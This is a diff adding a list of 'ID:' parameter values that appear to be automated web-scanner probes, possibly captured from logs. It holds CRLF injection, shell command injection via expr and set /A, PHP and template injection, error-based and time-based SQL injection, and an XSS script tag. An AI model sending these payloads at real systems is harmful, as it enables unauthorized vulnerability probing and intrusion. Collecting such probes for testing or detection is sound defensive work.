@@ -1,0 +1,86 @@
+ID:1
+ID:1
+expr 913663499 + 970487790
+
+ID:1
+CRLF-Header:CRLF-Value
+ID:1%0d%0aCRLF-Header:CRLF-Value
+ID:scgtjcfigqncestnoudr
+ID:1|expr 882195183 + 990049765 
+ID:1\r\nCRLF-Header:CRLF-Value
+ID:1$(expr 949369783 + 883818162)
+ID:1&set /A 828114983+820251837
+ID:${@var_dump(md5(345459440))};
+ID:'-var_dump(md5(815361125))-'
+ID:/*1*/{{971698510+960676061}}
+ID:${954551228+973588843}
+ID:${(869509626+987398109)?c}
+ID:#set($c=988748729+973216038)${c}$c
+ID:<%- 953507708+910164778 %>
+ID:1
+ID:1
+ID:1
+ID:1'and/**/extractvalue(1,concat(char(126),md5(1180858711)))and'
+ID:1"and/**/extractvalue(1,concat(char(126),md5(1683255081)))and"
+ID:extractvalue(1,concat(char(126),md5(1075129232)))
+ID:1'and(select'1'from/**/cast(md5(1393237708)as/**/int))>'0
+ID:1/**/and/**/cast(md5('1140266326')as/**/int)>0
+ID:convert(int,sys.fn_sqlvarbasetostr(HashBytes('MD5','1615419616')))
+ID:1'and/**/convert(int,sys.fn_sqlvarbasetostr(HashBytes('MD5','1098845996')))>'0
+ID:1鎈'"\(
+ID:1/**/and+4=4
+ID:1/**/and+3=7
+ID:1'and'x'='x
+ID:1'and'y'='a
+ID:1"and"a"="a
+ID:1"and"p"="y
+ID:1
+ID:1
+ID:1
+ID:(select*from(select+sleep(0)union/**/select+1)a)
+ID:(select*from(select+sleep(2)union/**/select+1)a)
+ID:1'and(select*from(select+sleep(0))a/**/union/**/select+1)='
+ID:1'and(select*from(select+sleep(2))a/**/union/**/select+1)='
+ID:1"and(select*from(select+sleep(0))a/**/union/**/select+1)="
+ID:1"and(select*from(select+sleep(2))a/**/union/**/select+1)="
+ID:1"and(select*from(select+sleep(3))a/**/union/**/select+1)="
+ID:1' --
+ID:1' --
+expr 927487358 + 816018922
+
+ID:1' --|expr 916061900 + 968664985 
+ID:1' --$(expr 819690580 + 986812731)
+ID:1' --&set /A 810058306+849681646
+ID:${@var_dump(md5(988978942))};
+ID:'-var_dump(md5(213921115))-'
+ID:/*1*/{{928942639+931141071}}
+ID:${808721427+867963270}
+ID:${(811756067+839558340)?c}
+ID:#set($c=833192209+891340815)${c}$c
+ID:<%- 975779260+811403775 %>
+ID:1' --
+ID:1' --
+ID:1' --
+ID:1' --'and/**/extractvalue(1,concat(char(126),md5(1488288022)))and'
+ID:1' --"and/**/extractvalue(1,concat(char(126),md5(1211684584)))and"
+ID:extractvalue(1,concat(char(126),md5(1419445968)))
+ID:1' --'and(select'1'from/**/cast(md5(1968027280)as/**/int))>'0
+ID:1' --/**/and/**/cast(md5('1161628700')as/**/int)>0
+ID:convert(int,sys.fn_sqlvarbasetostr(HashBytes('MD5','1985961655')))
+ID:1' --'and/**/convert(int,sys.fn_sqlvarbasetostr(HashBytes('MD5','1794740506')))>'0
+ID:1' --鎈'"\(
+ID:1' --'and'w'='w
+ID:1' --'and'z'='f
+ID:1' --"and"e"="e
+ID:1' --"and"o"="g
+ID:1' --
+ID:1' --
+ID:1' --
+ID:1' --'and(select*from(select+sleep(0))a/**/union/**/select+1)='
+ID:1' --'and(select*from(select+sleep(2))a/**/union/**/select+1)='
+ID:1' --"and(select*from(select+sleep(0))a/**/union/**/select+1)="
+ID:1' --"and(select*from(select+sleep(2))a/**/union/**/select+1)="
+ID:1' --"and(select*from(select+sleep(3))a/**/union/**/select+1)="
+ID:srkgrtzsdspzwpxfsnei
+ID:<zzsmkstwtr>
+ID:<sCrIpT>zzsmkstwtr</sCrIpT>
